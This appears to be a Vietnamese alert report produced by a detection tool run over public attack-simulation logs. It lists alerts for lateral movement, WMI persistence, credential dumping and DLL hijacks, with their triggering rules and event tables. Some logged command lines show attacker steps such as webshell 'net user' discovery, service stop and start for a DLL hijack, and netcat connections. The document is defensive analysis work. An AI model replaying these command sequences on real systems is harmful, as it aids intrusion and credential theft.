- file log: labels__mordor__lateral_movement__host__covenant_sharpsc_stop_dcerpc_smb_svcctl__covenant_sharpsc_stop_dcerpc_smb_svcctl_2020-08-06031938.json
- **vì sao báo:**
  - chạy từ thư mục người dùng ghi được (temp, profile, programdata) (`b_user_writable`, 9 event)

| Thời gian | Event | Process | p | Tactic | Command line |
|---|---|---|---|---|---|
| 07:20:03 | Sysmon 3 | grunthttp.exe | 1.00 | lateral-movement |  |
| 07:20:24 | Security 5156 | grunthttp.exe | 0.99 | lateral-movement |  |
| 07:20:03 | Security 5156 | grunthttp.exe | 0.99 | lateral-movement |  |
| 07:20:03 | Security 5156 | grunthttp.exe | 0.99 | lateral-movement |  |
| 07:20:03 | Security 5158 | grunthttp.exe | 0.97 | command-and-control |  |

### A0038 · high · IT001.shire.com

- thời gian: 2019-12-05 04:47:55 → 04:47:55 UTC, 3 event, 1 process
- tactic: persistence (2); lateral-movement (1)
- process: ; user: pgustavo
- file log: labels__mordor__persistence__host__covenant_persistwmi__covenant_persistwmi_2019-12-05044734.json
- **vì sao báo:**
  - WMI event subscription (persistence) (`f_wmi_sub`, 1 event) ⚠

| Thời gian | Event | Process | p | Tactic | Command line |
|---|---|---|---|---|---|
| 04:47:55 | Sysmon 19 |  | 1.00 | lateral-movement |  |
| 04:47:55 | Sysmon 20 |  | 1.00 | persistence |  |
| 04:47:55 | Sysmon 21 |  | 0.99 | persistence |  |

### A0039 · high · WORKSTATION5

- thời gian: 2020-10-18 06:17:03 → 06:17:11 UTC, 170 event, 12 process
- tactic: defense-evasion (164); lateral-movement (4); persistence (2)
- process: wmic.exe (97), calc.exe (41), calculator.exe (8), wmiprvse.exe (6), runtimebroker.exe (3), cmd.exe (1); user: wardog
- file log: labels__mordor__defense_evasion__host__wmic_remote_xsl_jscript__wmic_remote_xsl_jscript_2020-10-1802171958.json
- **vì sao báo:**
  - khoá Winlogon (`k_winlogon`, 8 event)
  - tải file / script từ mạng (`f_download`, 3 event)
  - đọc bộ nhớ process khác (`b_vm_read`, 3 event)
  - can thiệp Defender / firewall (`f_av_tamper`, 2 event) ⚠
  - dump lsass / SAM / NTDS (`f_cred_dump_file`, 2 event) ⚠
  - named pipe RPC nhạy cảm (svcctl, samr, lsarpc...) (`f_rpc_pipe`, 2 event)
  - đọc kho mật khẩu, cookie, credential (`f_cred_store`, 2 event)
  - mở process với toàn quyền (`b_full_access`, 1 event)

| Thời gian | Event | Process | p | Tactic | Command line |
|---|---|---|---|---|---|
| 06:17:04 | Security 4688 | calc.exe | 1.00 | defense-evasion | "C:\Windows\System32\calc.exe"  |
| 06:17:03 | Security 4674 | wmic.exe | 1.00 | defense-evasion |  |
| 06:17:03 | Security 4674 | wmic.exe | 1.00 | defense-evasion |  |
| 06:17:03 | Security 4674 | wmic.exe | 1.00 | defense-evasion |  |
| 06:17:03 | Security 4674 | wmic.exe | 1.00 | defense-evasion |  |

### A0040 · high · IEWIN7

- thời gian: 2019-05-24 01:33:53 → 01:33:53 UTC, 3 event, 3 process
- tactic: privilege-escalation (2); discovery (1)
- process: cmd.exe (1), net.exe (1), net1.exe (1); user: DefaultAppPool
- file log: labels__evtx__Lateral Movement__LM_typical_IIS_webshell_sysmon_1_10_traces.json
- **vì sao báo:**
  - lệnh khám phá hệ thống / domain (`f_discovery_cmd`, 3 event)

| Thời gian | Event | Process | p | Tactic | Command line |
|---|---|---|---|---|---|
| 01:33:53 | Sysmon 1 | cmd.exe | 1.00 | privilege-escalation | "c:\windows\system32\cmd.exe" /c net user |
| 01:33:53 | Sysmon 1 | net.exe | 0.99 | privilege-escalation | net  user |
| 01:33:53 | Sysmon 1 | net1.exe | 0.84 | discovery | C:\Windows\system32\net1  user |

### A0041 · high · MSEDGEWIN10

- thời gian: 2020-03-08 22:11:34 → 22:11:34 UTC, 2 event, 1 process
- tactic: credential-access (2)
- process: cscript.exe (2); user: IEUser
- file log: labels__evtx__Credential Access__CA_hashdump_4663_4656_lsass_access.json
- **vì sao báo:**
  - dump lsass / SAM / NTDS (`f_cred_dump_file`, 2 event) ⚠
  - named pipe RPC nhạy cảm (svcctl, samr, lsarpc...) (`f_rpc_pipe`, 2 event)

| Thời gian | Event | Process | p | Tactic | Command line |
|---|---|---|---|---|---|
| 22:11:34 | Security 4663 | cscript.exe | 1.00 | credential-access |  |
| 22:11:34 | Security 4656 | cscript.exe | 0.98 | credential-access |  |

### A0042 · high · IEWIN7

- thời gian: 2019-05-11 17:10:06 → 17:10:10 UTC, 6 event, 6 process
- tactic: defense-evasion (2); persistence (2); privilege-escalation (1); command-and-control (1)
- process: wusa.exe (2), python.exe (1), svchost.exe (1), cmd.exe (1); user: IEUser, IEWIN7$
- file log: labels__evtx__Privilege Escalation__security_4624_4673_token_manip.json

| Thời gian | Event | Process | p | Tactic | Command line |
|---|---|---|---|---|---|
| 17:10:10 | Security 4688 | python.exe | 1.00 | privilege-escalation |  |
| 17:10:10 | Security 4624 | svchost.exe | 0.99 | command-and-control |  |
| 17:10:10 | Security 4688 | wusa.exe | 0.97 | defense-evasion |  |
| 17:10:10 | Security 4688 | cmd.exe | 0.82 | persistence |  |
| 17:10:06 | Eventlog 1102 |  | 0.66 | defense-evasion |  |

### A0043 · high · PC01.example.corp

- thời gian: 2019-02-13 18:03:28 → 18:05:19 UTC, 11 event, 5 process
- tactic: command-and-control (4); discovery (3); lateral-movement (2); defense-evasion (1); persistence (1)
- process: plink.exe (4), system (3), - (2), winlogon.exe (1), rundll32.exe (1); user: PC01$, admin01, user01
- file log: labels__evtx__Command and Control__DE_RDP_Tunnel_5156.json
- **vì sao báo:**
  - chạy từ thư mục người dùng ghi được (temp, profile, programdata) (`b_user_writable`, 4 event)

| Thời gian | Event | Process | p | Tactic | Command line |
|---|---|---|---|---|---|
| 18:03:28 | Security 4688 | plink.exe | 1.00 | defense-evasion |  |
| 18:04:01 | Security 5156 | plink.exe | 0.99 | lateral-movement |  |
| 18:04:45 | Security 5156 | plink.exe | 0.99 | lateral-movement |  |
| 18:04:57 | Security 4624 | - | 0.97 | command-and-control |  |
| 18:04:43 | Security 4624 | - | 0.97 | command-and-control |  |

### A0044 · high · MSEDGEWIN10

- thời gian: 2020-03-21 12:35:35 → 12:36:07 UTC, 8 event, 7 process
- tactic: privilege-escalation (3); defense-evasion (2); lateral-movement (1); discovery (1); persistence (1)
- process: nc.exe (3), sc.exe (2), net.exe (1), net1.exe (1), whoami.exe (1); user: IEUser, SYSTEM
- file log: labels__evtx__Defense Evasion__Sysmon 7 dllhijack_cdpsshims_CDPSvc.json
- **vì sao báo:**
  - chạy từ thư mục người dùng ghi được (temp, profile, programdata) (`b_user_writable`, 3 event)
  - lệnh khám phá hệ thống / domain (`f_discovery_cmd`, 1 event)

| Thời gian | Event | Process | p | Tactic | Command line |
|---|---|---|---|---|---|
| 12:36:06 | Sysmon 1 | nc.exe | 1.00 | privilege-escalation | nc.exe  127.0.0.1 1337 |
| 12:36:03 | Sysmon 1 | whoami.exe | 0.99 | persistence | whoami |
| 12:35:55 | Sysmon 1 | net.exe | 0.98 | privilege-escalation | net  start CDPSvc |
| 12:35:35 | Sysmon 1 | sc.exe | 0.98 | privilege-escalation | sc  stop CDPSvc |
| 12:36:03 | Sysmon 5 | nc.exe | 0.96 | defense-evasion |  |

### A0045 · high · MSEDGEWIN10

- thời gian: 2020-03-21 05:00:16 → 05:00:45 UTC, 5 event, 5 process
- tactic: persistence (3); execution (1); privilege-escalation (1)
- process: usoclient.exe (1), rundll32.exe (1), nc.exe (1), cmd.exe (1), whoami.exe (1); user: IEUser, SYSTEM
- file log: labels__evtx__Defense Evasion__Sysmon 7  Update Session Orchestrator Dll Hijack.json
- **vì sao báo:**
  - chạy từ thư mục người dùng ghi được (temp, profile, programdata) (`b_user_writable`, 1 event)
  - lệnh khám phá hệ thống / domain (`f_discovery_cmd`, 1 event)

| Thời gian | Event | Process | p | Tactic | Command line |
|---|---|---|---|---|---|
| 05:00:39 | Sysmon 1 | nc.exe | 1.00 | privilege-escalation | nc.exe  127.0.0.1 1337 |
| 05:00:45 | Sysmon 1 | whoami.exe | 0.99 | persistence | whoami |
| 05:00:39 | Sysmon 1 | cmd.exe | 0.99 | persistence | "C:\Windows\system32\cmd.exe" |
| 05:00:16 | Sysmon 1 | usoclient.exe | 0.97 | execution | usoclient  StartInteractiveScan |
| 05:00:33 | Sysmon 3 | rundll32.exe | 0.97 | persistence |  |

### A0046 · high · WIN-77LTAPHIQ1R.example.corp

- thời gian: 2019-03-19 00:02:00 → 00:02:17 UTC, 28 event, 5 process
- tactic: lateral-movement (8); discovery (8); privilege-escalation (4); defense-evasion (4); execution (2); persistence (2)
- process: - (4), lsass.exe (3), cmd.exe (1), tasklist.exe (1); user: ANONYMOUS LOGON, Administrator, WIN-77LTAPHIQ1R$, administrator
- file log: labels__evtx__Lateral Movement__LM_ScheduledTask_ATSVC_target_host.json
- **vì sao báo:**
  - truy cập share quản trị (ADMIN$, C$, IPC$) (`f_admin_share`, 9 event)
  - named pipe RPC nhạy cảm (svcctl, samr, lsarpc...) (`f_rpc_pipe`, 1 event)

| Thời gian | Event | Process | p | Tactic | Command line |
|---|---|---|---|---|---|
| 00:02:17 | Security 4661 | lsass.exe | 1.00 | discovery |  |
| 00:02:17 | Security 4661 | lsass.exe | 0.99 | discovery |  |
| 00:02:04 | Security 4698 |  | 0.99 | execution |  |
| 00:02:04 | Security 4699 |  | 0.99 | execution |  |
| 00:02:04 | Security 5145 |  | 0.99 | lateral-movement |  |

### A0047 · high · WORKSTATION5

- thời gian: 2020-10-22 03:28:11 → 03:28:11 UTC, 10 event, 3 process
- tactic: defense-evasion (4); execution (4); persistence (1); discovery (1)
- process: reg.exe (8), cmd.exe (1); user: wardog
- file log: labels__mordor__discovery__host__cmd_discover_iexplorer_version_registry__cmd_discover_iexplorer_version_registry_2020-10-2123281491.json
- **vì sao báo:**
  - lệnh khám phá hệ thống / domain (`f_discovery_cmd`, 2 event)
  - mở process với toàn quyền (`b_full_access`, 1 event)
  - đọc bộ nhớ process khác (`b_vm_read`, 1 event)

| Thời gian | Event | Process | p | Tactic | Command line |
|---|---|---|---|---|---|
| 03:28:11 | Security 4658 | reg.exe | 1.00 | execution |  |
| 03:28:11 | Security 4658 | reg.exe | 1.00 | execution |  |
| 03:28:11 | Security 4656 | reg.exe | 0.99 | execution |  |
| 03:28:11 | Security 4663 | reg.exe | 0.99 | execution |  |
| 03:28:11 | Security 4689 | reg.exe | 0.99 | defense-evasion |  |

### A0048 · high · PC01.example.corp

- thời gian: 2019-03-18 11:06:25 → 11:27:05 UTC, 5 event, 4 process
- tactic: defense-evasion (3); command-and-control (1); persistence (1)
- process: svchost.exe (1), cmd.exe (1), wmic.exe (1); user: PC01$, user01
- file log: labels__evtx__Lateral Movement__LM_4624_mimikatz_sekurlsa_pth_source_machine.json, labels__evtx__Lateral Movement__LM_WMIC_4648_rpcss.json

| Thời gian | Event | Process | p | Tactic | Command line |
|---|---|---|---|---|---|
| 11:06:29 | Security 4624 | svchost.exe | 0.99 | command-and-control |  |
| 11:06:29 | Security 4688 | cmd.exe | 0.82 | persistence |  |
| 11:27:05 | Security 4688 | wmic.exe | 0.76 | defense-evasion |  |
| 11:06:25 | Eventlog 1102 |  | 0.66 | defense-evasion |  |
| 11:27:00 | Eventlog 1102 |  | 0.66 | defense-evasion |  |

### A0049 · high · 2012r2srv.maincorp.local

- thời gian: 2017-06-12 23:39:43 → 23:39:43 UTC, 3 event, 2 process
- tactic: discovery (1); privilege-escalation (1); defense-evasion (1)
- process: lsass.exe (2); user: Administrator, Andrei
- file log: labels__evtx__Privilege Escalation__4765_sidhistory_add_t1178.json

| Thời gian | Event | Process | p | Tactic | Command line |
|---|---|---|---|---|---|
| 23:39:43 | Security 4661 | lsass.exe | 0.99 | discovery |  |
| 23:39:43 | Security 4765 |  | 0.84 | privilege-escalation |  |
| 23:39:43 | Security 4658 | lsass.exe | 0.70 | defense-evasion |  |

### A0050 · high · WIN-77LTAPHIQ1R.example.corp

- thời gian: 2019-03-18 22:15:49 → 22:15:49 UTC, 4 event, 1 process
- tactic: discovery (3); defense-evasion (1)
- process: - (4); user: Administrator, user01
- file log: labels__evtx__Lateral Movement__LM_WMI_4624_4688_TargetHost.json

| Thời gian | Event | Process | p | Tactic | Command line |
|---|---|---|---|---|---|
| 22:15:49 | Security 4624 | - | 0.99 | defense-evasion |  |
| 22:15:49 | Security 4624 | - | 0.95 | discovery |  |
| 22:15:49 | Security 4624 | - | 0.95 | discovery |  |
| 22:15:49 | Security 4624 | - | 0.79 | discovery |  |

_Còn 53 cảnh báo, xem alerts.csv._
